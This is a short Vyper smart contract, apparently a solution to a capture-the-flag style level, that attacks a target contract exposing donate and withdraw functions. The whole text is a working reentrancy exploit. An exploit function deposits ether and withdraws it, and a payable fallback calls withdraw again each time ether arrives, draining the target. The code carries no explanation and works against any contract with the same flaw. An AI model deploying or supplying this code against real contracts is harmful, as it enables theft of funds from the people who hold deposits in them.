# @version 0.3.3

interface Target:
    def donate(_to: address): payable   
    def withdraw(_amount: uint256): nonpayable


@external
@payable
def exploit(instance: address):
    Target(instance).donate(self, value=msg.value)
    Target(instance).withdraw(msg.value)

@payable
@external
def __default__():
    Target(msg.sender).withdraw(msg.value)
    
    
    
    
